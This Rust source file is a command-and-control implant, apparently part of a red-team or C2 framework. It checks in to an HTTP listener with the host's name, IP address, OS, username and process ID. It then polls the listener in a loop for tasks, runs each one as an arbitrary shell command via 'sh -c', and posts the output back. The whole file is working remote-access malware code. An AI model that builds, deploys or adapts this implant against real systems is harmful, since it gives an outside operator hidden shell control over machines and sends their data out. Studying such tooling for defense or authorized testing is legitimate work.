use clap::Parser;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::SystemTime;
use std::{net::UdpSocket, process::Command, time::Duration};
use tokio::time::sleep;
use uuid::Uuid;
use whoami;

use rb::message::*;
use rb::task::*;

/// Command-and-Control implant connecting to the HTTP listener
#[derive(Parser)]
struct Args {
    /// Listener host (default: localhost)
    #[clap(long, default_value = "localhost")]
    host: String,

    /// Listener port (default: 8080)
    #[clap(short, long, default_value = "8080")]
    port: u16,

    /// Poll interval in seconds
    #[clap(long, default_value = "5")]
    interval: u64,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let base_url = format!("http://{}:{}", args.host, args.port);
    let client = Client::new();

    let ip_address = UdpSocket::bind("0.0.0.0:0")
        .and_then(|sock| sock.connect((&*args.host, args.port)).map(|_| sock))
        .and_then(|sock| sock.local_addr())
        .map(|addr| addr.ip().to_string())
        .unwrap_or_else(|_| "0.0.0.0".to_string());

    let checkin = ImplantCheckin {
        id: None,
        hostname: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
        ip_address,
        os_info: whoami::platform().to_string(), // drop version field
        username: whoami::username(),
        process_id: std::process::id(),
    };

    println!("Checking in to {}...", &base_url);
    let resp = client
        .post(&format!("{}/checkin", base_url))
        .json(&checkin)
        .send()
        .await?;

    if !resp.status().is_success() {
        eprintln!("Check-in failed: HTTP {}", resp.status());
        let body = resp.text().await.unwrap_or_default();
        eprintln!("Response: {}", body);
        return Err("Check-in HTTP error".into());
    }

    let data: CheckinResponse = resp.json().await?;
    let implant_id = data.implant_id;
    println!("Checked in. Implant ID: {}", implant_id);

    println!("data: {:?}", data);

    loop {
        let tasks_resp = client
            .get(&format!("{}/tasks/{}", base_url, implant_id))
            .send()
            .await?;
        // let tasks: Vec<CommandRequest> = tasks_resp.json().await.unwrap_or_default();
        let tasks: Vec<Task> = tasks_resp.json().await.unwrap_or_else(|_| {
            eprintln!("Failed to parse tasks response");
            vec![]
        });

        println!("tasks: {:?}", tasks);

        for task in tasks {
            println!("Executing command: {}", task.command);
            let output = Command::new("sh").arg("-c").arg(&task.command).output()?;
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();

            let now = SystemTime::now();
            let result = TaskResult {
                task_id: task.id,
                implant_id,
                session_id: task.session_id,
                output: stdout.clone(),
                error: Some(String::from_utf8_lossy(&output.stderr).to_string()),
                completed_at: now,
                status: TaskStatus::Completed,
                status_code: output.status.code(),
            };

            let _ = client
                .post(&format!("{}/results", base_url))
                .json(&result)
                .send()
                .await?;
        }

        sleep(Duration::from_secs(args.interval)).await;
    }
}
